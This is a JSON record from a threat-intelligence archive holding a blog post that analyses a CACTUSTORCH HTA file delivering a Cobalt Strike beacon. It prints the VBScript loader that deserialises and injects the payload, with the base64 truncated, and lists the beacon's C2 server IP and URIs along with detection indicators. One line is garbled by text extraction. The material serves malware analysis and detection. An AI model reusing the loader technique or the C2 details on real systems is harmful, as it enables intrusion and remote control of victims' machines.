@@ -1,0 +1,62 @@
+{
+    "id": "f45f6805-fa89-45e6-b2d1-496cb5dc8ea8",
+    "created_at": "2023-01-12T14:58:53.499128Z",
+    "updated_at": "2025-03-27T02:09:18.137008Z",
+    "deleted_at": null,
+    "sha1_hash": "14b2f1b25ec2ef5229f0da1061d681a9a0e4c3c4",
+    "title": "2022-01-16 - Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike",
+    "authors": "",
+    "file_creation_date": "2022-05-28T05:06:55Z",
+    "file_modification_date": "2022-05-28T05:06:55Z",
+    "file_size": 246641,
+    "plain_text": "# Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike\n\n**forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/**\n\n### By Tony Lambert Posted 2022-01-16 Updated 2022-03-28 7 min read\n\n\nJanuary 16, 2022\n\n\n### There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going to look at a malicious HTA file created using CACTUSTORCH and designed to distribute a Cobalt Strike beacon. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/\n\n## Triaging the File\n\n### MalwareBazaar tags say the file is a HTA, and we can use file and head to confirm this.\n```\n  remnux@remnux:~/cases/hta-cs$ file 1234.hta \n  1234.hta: HTML document, ASCII text, with very long lines, with CRLF line\n  terminators\n  remnux@remnux:~/cases/hta-cs$ head -c 100 1234.hta \n  <script language=\"VBScript\">\n  Dim binary : binary = \"notepad.exe\"\n  Dim code : code = \"TVroAAAAAFuJ31\n\n Alrighty then, it looks like file thinks the sample is a HTML document (containing HTML tags). The head command shows us the first 100 bytes here, and it looks like the file does contain at least one script HTML tag.\n\n Let’s take a look at the content!\n\n## Analyzing the HTA Content\n\n### I’ve included the contents of the HTA below, truncating a lot of base64 code that was included so we can see the good stuff.\n  <script language=\"VBScript\">\n  Dim binary : binary = \"notepad.exe\"\n  Dim code : code = \"TVroAAAAAFuJ31J...\"\n  Sub Debug(s)\n  End Sub\n  Sub SetVersion\n  End Sub\n  Function Base64ToStream(b)\n   Dim enc, length, ba, transform, ms\n   Set enc = CreateObject(\"System.Text.ASCIIEncoding\")\n   length = enc.GetByteCount_2(b)\n   Set transform = CreateObject(\"System.Security.Cryptography.FromBase64Transform\")\n   Set ms = CreateObject(\"System.IO.MemoryStream\")\n   ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4)\n  * 3)\n   ms.Position = 0\n   Set Base64ToStream = ms\n  End Function\n  Sub Run\n  Dim s, entry_class\n  s = \"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy\"\n  s = s & \"AwAAAAhEZWx...\"\n  entry_class = \"cactusTorch\"\n  Dim fmt, al, d, o\n  Set fmt = CreateObject(\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\")\n  Set al = CreateObject(\"System.Collections.ArrayList\")\n  al.Add fmt.SurrogateSelector\n  Set d = fmt.Deserialize_2(Base64ToStream(s))\n  Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)\n  o.flame binary,code\n  End Sub\n\n```\n\n-----\n\n```\n  On Error Resume Next\n  Run\n  If Err.Number <> 0 Then\n   Debug Err.Description\n   Err.Clear\n  End If\n  self.close\n  </script>\n\n### When looking at the sample there are a few things that stand out. First, there are two large chunks of base64 code in the file. The filesize of the HTA is around 287 KiB, which is really hefty for a text file. When you have plaintext files that large, we can usually assume there are obfuscation schemes or binary/shellcode content embedded. In this case, the strings and variable names are too neat and not scrambled, so obfuscation is out. The first base64 chunk starts with TVro, which decodes to a MZ header seen with Windows EXEs.\n\n The second big thing that stands out is binary = \"notepad.exe\" . This is a quick and simple indicator for our analysis. Process names like this in malicious code typically mean that the malicious binary content will be saved and executed as the process name or injected into a process of the same name. If the name is a legitimate Windows binary I tend to lean toward the latter case of injection.\n\n```\n\n-----\n\n### a y, e t y_c ass cactus o c s s g ca t s e o code eads us to t e C C US O C p oject s te p ate CACTUSTORCH is a project to embed Cobalt Strike beacons into script content such as HTA and VBS files. Thankfully, the template gives us a head start on analysis. The second base64 chunk is static content and the first looks to be variable content containing the actual payload. With that in mind, let’s extract the payload.\n\n## Decoding the Payload\n\n### To decode the payload, we can place all the base64 content into its own file and then use the base64 -d command to get the cleartext payload.\n```\n  remnux@remnux:~/cases/hta-cs$ cat payload.b64 | base64 -d > payload.bin\n  remnux@remnux:~/cases/hta-cs$ file payload.bin \n  payload.bin: MS-DOS executable PE32 executable (DLL) (GUI) Intel 80386, for MS\n  Windows\n  remnux@remnux:~/cases/hta-cs$ md5sum payload.bin \n  86a7eaba09313ab6b4a01a5e6d573acc payload.bin\n\n By searching for the MD5 hash on VirusTotal we can see someone’s already reported the beacon executable content and a load of vendors detect it as Cobalt Strike. Let’s squeeze some more indicators from this beacon using 1768.py:\n  remnux@remnux:~/cases/hta-cs$ 1768.py payload.bin \n  File: payload.bin\n  payloadType: 0x10014a34\n  payloadSize: 0x00000000\n  intxorkey: 0x00000000\n  id2: 0x00000000\n  Config found: xorkey b'.' 0x0002fe20 0x00033000\n  0x0001 payload type           0x0001 0x0002 0 windows-beacon_http-reverse_http\n  0x0002 port               0x0001 0x0002 12342\n  0x0003 sleeptime            0x0002 0x0004 60000\n  0x0004 maxgetsize            0x0002 0x0004 1048576\n  0x0005 jitter              0x0001 0x0002 0\n  0x0006 maxdns              0x0001 0x0002 255\n  0x0007 publickey            0x0003 0x0100\n  30819f300d06092a864886f70d010101050003818d00308189028181009352527b27bf73fcc92457cf8cb1894ebd1104da185d18dceb28f159d74958d0ae657a003\n  00000\n  0x0008 server,get-uri          0x0003 0x0100 '42.193.229.33,/j.ad'\n  0x0009 useragent            0x0003 0x0080 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'\n  0x000a post-uri             0x0003 0x0040 '/submit.php'\n  0x000b Malleable_C2_Instructions    0x0003 0x0100\n   Transform Input: [7:Input,4]\n   Print\n  0x000c http_get_header         0x0003 0x0100\n   Build Metadata: [7:Metadata,3,6:Cookie]\n   BASE64\n   Header Cookie\n  0x000d http_post_header         0x0003 0x0100\n   Const_header Content-Type: application/octet-stream\n   Build SessionId: [7:SessionId,5:id]\n   Parameter id\n   Build Output: [7:Output,4]\n   Print\n  0x000e SpawnTo             0x0003 0x0010 (NULL ...)\n  0x001d spawnto_x86           0x0003 0x0040 '%windir%\\\\syswow64\\\\rundll32.exe'\n  0x001e spawnto_x64           0x0003 0x0040 '%windir%\\\\sysnative\\\\rundll32.exe'\n  0x000f pipename             0x0003 0x0080 (NULL ...)\n  0x001f CryptoScheme           0x0001 0x0002 0\n  0x0013 DNS_Idle             0x0002 0x0004 0 0.0.0.0\n  0x0014 DNS_Sleep            0x0002 0x0004 0\n  0x001a get-verb             0x0003 0x0010 'GET'\n  0x001b post-verb            0x0003 0x0010 'POST'\n  0x001c HttpPostChunk          0x0002 0x0004 0\n  0x0025 license-id            0x0002 0x0004 305419896\n  0x0026 bStageCleanup          0x0001 0x0002 0\n  0x0027 bCFGCaution           0x0001 0x0002 0\n  0x0036 HostHeader            0x0003 0x0080 (NULL ...)\n  0x0032 UsesCookies           0x0001 0x0002 1\n  0x0023 proxy_type            0x0001 0x0002 2 IE settings\n  0x0037 EXIT_FUNK            0x0001 0x0002 0\n  0x0028 killdate 0x0002 0x0004 0\n\n```\n\n-----\n\n```\n0x002b process-inject-start-rwx     0x0001 0x0002 64 PAGE_EXECUTE_READWRITE\n0x002c process-inject-use-rwx      0x0001 0x0002 64 PAGE_EXECUTE_READWRITE\n0x002d process-inject-min_alloc     0x0002 0x0004 0\n0x002e process-inject-transform-x86   0x0003 0x0100 (NULL ...)\n0x002f process-inject-transform-x64   0x0003 0x0100 (NULL ...)\n0x0035 process-inject-stub       0x0003 0x0010 '¥l\\x818d¯\\x87\\x8aL\\x10\\x08<¡W\\x8e\\n'\n0x0033 process-inject-execute      0x0003 0x0080 '\\x01\\x02\\x03\\x04'\n0x0034 process-inject-allocation-method 0x0001 0x0002 0\n0x0000\nGuessing Cobalt Strike version: 4.0 (max 0x0037)\n\n```\n\n-----\n\n### The most actionable indicators from this output are:\n\n server,get-uri ‘42.193.229.33,/j.ad’ port 12342 useragent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)’ post-uri ‘/submit.php’ spawnto_x86 ‘%windir%\\syswow64\\rundll32.exe’ spawnto_x64 ‘%windir%\\sysnative\\rundll32.exe’\n\n The server, get-uri, set-uri, port, and useragent fields are pretty helpful for network-based detection telemetry. In you can use PCAP, logs, or Netflow evidence to spot one or more of these components. The useragent and post-uri fields will need to be combined with additional data to be effective. The spawnto_* fields are helpful for endpoint-based detection telemetry. You can use Sysmon, EDR, or whatever else to look for suspicious instances of rundll32.exe with no command line. For this particular threat, we’ll likely see a process ancestry of mshta.exe ```\n> notepad.exe -> rundll32.exe .\n\n A data point that is less actionable but still interesting is the license-id/watermark. In this case the beacon contains the license-id value\n305419896 . This value has been seen in multiple incidents over the last few years, and it corresponds with a leaked version of Cobalt\n\n Strike.\n\n Now that we’ve squeezed all those indicators out of the beacon, let’s try and confirm the process ancestry for endpoint detection analytics.\n\n## Using a Sandbox Report to Confirm Behavior\n\n### Thankfully, a sandbox report for the HTA already exists thanks to VMRay: https://www.vmray.com/analyses/4d4d70e19184/report/overview.html\n\n Looking over at the “Behavior” tab, we can confirm at least part of the ancestry:\n\n```\n\n-----\n\n### So for detection analytics we can look for instances of notepad.exe spawning from mshta.exe to find suspicious behavior for this threat. Thanks for reading!\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-16 - Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike.pdf"
+    ],
+    "report_names": [
+        "2022-01-16 - Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535533,
+    "ts_updated_at": 1743041358,
+    "ts_creation_date": 1653714415,
+    "ts_modification_date": 1653714415,
+    "files": {
+        "pdf": "https://archive.orkl.eu/14b2f1b25ec2ef5229f0da1061d681a9a0e4c3c4.pdf",
+        "text": "https://archive.orkl.eu/14b2f1b25ec2ef5229f0da1061d681a9a0e4c3c4.txt",
+        "img": "https://archive.orkl.eu/14b2f1b25ec2ef5229f0da1061d681a9a0e4c3c4.jpg"
+    }
+}
